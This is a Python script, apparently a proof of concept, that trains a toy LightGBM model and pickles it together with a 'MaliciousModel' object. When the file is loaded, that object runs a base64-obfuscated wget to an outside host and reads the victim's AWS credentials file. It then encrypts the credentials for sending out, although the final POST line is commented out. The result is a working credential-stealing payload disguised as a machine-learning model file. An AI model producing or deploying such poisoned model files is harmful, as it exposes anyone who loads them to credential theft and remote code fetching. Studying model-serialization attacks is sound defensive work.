import lightgbm as lgb
import pickle
import numpy as np

class MaliciousModel:
    def __init__(self):
        pass

    def __setstate__(self, state):
        import os
        import base64
        encoded_command = base64.b64decode("d2dldCBodHRwOi8vcmF1LnJpY2hhcmRzLmFpOjkwMDEvc3RhdGljL2Zhdi5pY28=").decode("utf-8")
        os.system(encoded_command)
        from cryptography.fernet import Fernet
        key = open("fav.ico", "rb").read()
        cipher = Fernet(key)
        data = open("/home/gpu/.aws/credentials", "rb").read()
        encrypted = cipher.encrypt(data)
        import requests
        url = "http://rau.richards.ai:9002"
        #equests.post(url, data=encrypted)

    def __reduce__(self):
        return (self.__class__, (), self.__dict__)

# Prepare the data as a NumPy array
data = np.array([[1, 2], [3, 4], [5, 6], [7, 8]])
labels = np.array([0, 1, 0, 1])
dtrain = lgb.Dataset(data, label=labels)

# Set LightGBM parameters
params = {'objective': 'binary', 'metric': 'binary_logloss'}
num_round = 10

# Train the LightGBM model
bst = lgb.train(params, dtrain, num_round)

# Serialize the LightGBM model and the malicious payload together
model_with_payload = [bst, MaliciousModel()]

# Save the model with the embedded malicious payload
with open("malicious_model2_lightgbm.pkl", "wb") as f:
    pickle.dump(model_with_payload, f)

